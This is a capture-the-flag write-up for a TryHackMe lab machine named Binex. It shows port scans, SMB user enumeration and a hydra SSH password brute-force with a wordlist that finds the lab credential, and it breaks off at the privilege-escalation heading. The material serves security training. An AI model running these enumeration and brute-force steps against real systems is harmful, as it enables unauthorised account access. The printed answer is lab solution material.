---
Escalate your privileges by exploiting vulnerable binaries.
---

# Binex — Writeup

## Overview
### Binex — Writeup
### Binex — Writeup
![](https://i.imgur.com/aohxmGa.jpg)
![222](https://tryhackme-images.s3.amazonaws.com/room-icons/2e7fc08002cc56de2f61e8e46365ae8f.png)
Start Machine
![222](https://i.ibb.co/McrC2hN/Picture5.png)
Enumerate the machine and get an interactive shell. Exploit an SUID bit file, use GNU debugger to take advantage of a buffer overflow and gain root access by PATH manipulation.
There are more points up for grabs in this room.
Answer the questions below
```rust

```

## Enumeration
```rust
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.248.150 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.248.150:22
Open 10.10.248.150:139
Open 10.10.248.150:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-18 18:04 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:04, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:04
Completed Parallel DNS resolution of 1 host. at 18:04, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:04
Scanning 10.10.248.150 [3 ports]
Discovered open port 22/tcp on 10.10.248.150
Discovered open port 139/tcp on 10.10.248.150
Discovered open port 445/tcp on 10.10.248.150
Completed Connect Scan at 18:04, 0.24s elapsed (3 total ports)
Initiating Service scan at 18:04
Scanning 3 services on 10.10.248.150
Completed Service scan at 18:04, 11.71s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.248.150.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:04
Completed NSE at 18:05, 6.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Nmap scan report for 10.10.248.150
Host is up, received user-set (0.23s latency).
Scanned at 2023-01-18 18:04:44 EST for 19s

PORT    STATE SERVICE     REASON  VERSION
22/tcp  open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3f36deda2fc3b7786fa925d641dd5469 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3OBXYJUrPGglNoKPhUcwp3YiZRy6qNTHdOmGsgzy5ll+GDY8zkoIsNiqdHSaDKXvO+9ix+dZNF9CtgRDrLhL6j2Bn4RI011xveUiTF6LO7PEsv5RYI7KueOXyaw8vahdf/CdV4RQXhefge6FIZqkvhDGQsid8F3e846kJ7FPZYAcwQ5Iapv9ae1+23OZcDLtdTDlQOZIyNaVmPu0XVjHYnvHsC5r/eX/wq9WzETDVzgANMwsWOeZmjH956z4hjL7K91KHeaMnRHeO/tln1Pk9EG1eGn4FHsD1/LdumWp0pHDUXwTJ7OwuuucnzuiLrx8jDr03bEu4kPKpkB0Bc1Kb
|   256 d07823eef37158aee9571417bbe36aae (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJlazDOaT1mvebWCf/KbUSzgt3MCueCjEYz6Uf6tDyYG5H7HsVTbKbphLPJupB3gght1wmk+8BpQe8q4fa+1ZXQ=
|   256 4cdef149df214f32cae68ebc6a9653e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIdOXbBN4ecgx8K412W8m2fd7R6y7c0O9uXXFv+gLusY
139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: THM_EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-01-18T23:04:57
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 6830/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 15281/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 59030/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48047/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: THM_EXPLOIT, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   THM_EXPLOIT<00>      Flags: <unique><active>
|   THM_EXPLOIT<03>      Flags: <unique><active>
|   THM_EXPLOIT<20>      Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   0000000000000000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: thm_exploit
|   NetBIOS computer name: THM_EXPLOIT\x00
|   Domain name: \x00
|   FQDN: thm_exploit
|_  System time: 2023-01-18T23:04:57+00:00

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.18 seconds
```
```rust
┌──(kali㉿kali)-[~/hackthebox]
└─$ smbclient -N -L 10.10.248.150

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT
```
```rust
┌──(kali㉿kali)-[~/hackthebox]
└─$ smbmap -u anonymous -H 10.10.248.150           
[+] Guest session   	IP: 10.10.248.150:445	Name: 10.10.248.150                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	IPC$                                              	NO ACCESS	IPC Service (THM_exploit server (Samba, Ubuntu))

┌──(root㉿kali)-[/home/kali/hackthebox]
└─# python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.248.150              
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.248.150
[*] StringBinding ncacn_np:10.10.248.150[\pipe\lsarpc]
[-] nca_s_op_rng_error

-┌──(kali㉿kali)-[~/hackthebox]
└─$ enum4linux -a -u "guest" -p "" 10.10.248.150     
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 18 18:37:15 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.248.150
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 10.10.248.150 )===========================

[+] Got domain/workgroup name: WORKGROUP

 ===============================( Nbtstat Information for 10.10.248.150 )===============================

Looking up status of 10.10.248.150
	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.248.150 )===================================

[+] Server 10.10.248.150 allows sessions using username 'guest', password ''

 ================================( Getting domain SID for 10.10.248.150 )================================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 37 D8 6D C8 84 C2 5E 58   78 62 8B DD B0 96 33 8E   7.m...^X xb....3.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

[+] Can't determine if host is part of domain or part of a workgroup

 ==================================( OS information on 10.10.248.150 )==================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.248.150 from srvinfo: 
Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 27 98 A4 F7 05 56 3E D2   0E A0 76 CC B3 19 93 A0   '....V>. ..v.....
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

 =======================================( Users on 10.10.248.150 )=======================================

[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 =================================( Share Enumeration on 10.10.248.150 )=================================

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT

[+] Attempting to map shares on 10.10.248.150

//10.10.248.150/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.248.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.248.150 )===========================

[+] Attaching to 10.10.248.150 using guest

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] THM_EXPLOIT
	[+] Builtin

[+] Password Info for Domain: THM_EXPLOIT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

[E] Failed to get password policy with rpcclient

 ======================================( Groups on 10.10.248.150 )======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ==================( Users on 10.10.248.150 via RID cycling (RIDS: 500-550,1000-1050) )==================

[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.

 ===============================( Getting printer info for 10.10.248.150 )===============================

Bad SMB2 (sign_algo_id=1) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] 7F 3D 16 73 86 C9 88 AC   51 E7 A2 99 10 6F 24 05   .=.s.... Q....o$.
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

enum4linux complete on Wed Jan 18 18:37:58 2023
```
```rust
┌──(kali㉿kali)-[~/hackthebox]
└─$ enum4linux -a 10.10.248.150   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan 18 18:38:25 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.248.150
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 10.10.248.150 )===========================

[+] Got domain/workgroup name: WORKGROUP

 ===============================( Nbtstat Information for 10.10.248.150 )===============================

Looking up status of 10.10.248.150
	THM_EXPLOIT     <00> -         B <ACTIVE>  Workstation Service
	THM_EXPLOIT     <03> -         B <ACTIVE>  Messenger Service
	THM_EXPLOIT     <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 10.10.248.150 )===================================

[+] Server 10.10.248.150 allows sessions using username '', password ''

 ================================( Getting domain SID for 10.10.248.150 )================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup

 ==================================( OS information on 10.10.248.150 )==================================

[E] Can't get OS info with smbclient

[+] Got OS info for 10.10.248.150 from srvinfo: 
	THM_EXPLOIT    Wk Sv PrQ Unx NT SNT THM_exploit server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 =======================================( Users on 10.10.248.150 )=======================================

Use of uninitialized value $users in print at ./enum4linux.pl line 972.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 =================================( Share Enumeration on 10.10.248.150 )=================================

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service (THM_exploit server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            THM_EXPLOIT

[+] Attempting to map shares on 10.10.248.150

//10.10.248.150/print$	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
//10.10.248.150/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 10.10.248.150 )===========================

[+] Attaching to 10.10.248.150 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] THM_EXPLOIT
	[+] Builtin

[+] Password Info for Domain: THM_EXPLOIT

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5

 ======================================( Groups on 10.10.248.150 )======================================

[+] Getting builtin groups:

[+]  Getting builtin group memberships:

[+]  Getting local groups:

[+]  Getting local group memberships:

[+]  Getting domain groups:

[+]  Getting domain group memberships:

 ==================( Users on 10.10.248.150 via RID cycling (RIDS: 500-550,1000-1050) )==================

[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-2007993849-1719925537-2372789573 and logon username '', password ''

S-1-5-21-2007993849-1719925537-2372789573-501 THM_EXPLOIT\nobody (Local User)
S-1-5-21-2007993849-1719925537-2372789573-513 THM_EXPLOIT\None (Domain Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\kel (Local User)
S-1-22-1-1001 Unix User\des (Local User)
S-1-22-1-1002 Unix User\tryhackme (Local User)
S-1-22-1-1003 Unix User\noentry (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 10.10.248.150 )===============================

No printers returned.

enum4linux complete on Wed Jan 18 19:00:22 2023

tryhackme
```

## Exploitation
```rust
┌──(kali㉿kali)-[~/hackthebox]
└─$ hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt 10.10.248.150 ssh -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-18 19:01:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.248.150:22/
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "jesucristo" - 848 of 14344436 [child 17] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "peewee" - 849 of 14344436 [child 18] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "paloma" - 850 of 14344436 [child 22] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "buddy1" - 851 of 14344436 [child 23] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "deedee" - 852 of 14344436 [child 32] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "miriam" - 853 of 14344436 [child 34] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "april" - 854 of 14344436 [child 36] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "patches" - 855 of 14344436 [child 37] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "regina" - 856 of 14344436 [child 39] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "janice" - 857 of 14344436 [child 50] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "cowboys" - 858 of 14344436 [child 54] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "myself" - 859 of 14344436 [child 58] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "lipgloss" - 860 of 14344436 [child 59] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "jazmin" - 861 of 14344436 [child 61] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "rosita" - 862 of 14344436 [child 63] (0/37)
[ATTEMPT] target 10.10.248.150 - login "tryhackme" - pass "happy1" - 863 of 14344436 [child 7] (0/37)
[22][ssh] host: 10.10.248.150   login: tryhackme   password: thebest
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 26 final worker threads did not complete until end.
[ERROR] 26 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-18 19:05:05

ssh
tryhackme:thebest
```
What are the login credential for initial access.
Answer format should be in **username:password**
Hint 1: RID range 1000-1003 Hint 2: The longest username has the unsecure password.
*tryhackme:thebest*

## Privilege Escalation
Read the flag.txt from des's home directory.
Answer the questions below
```bash
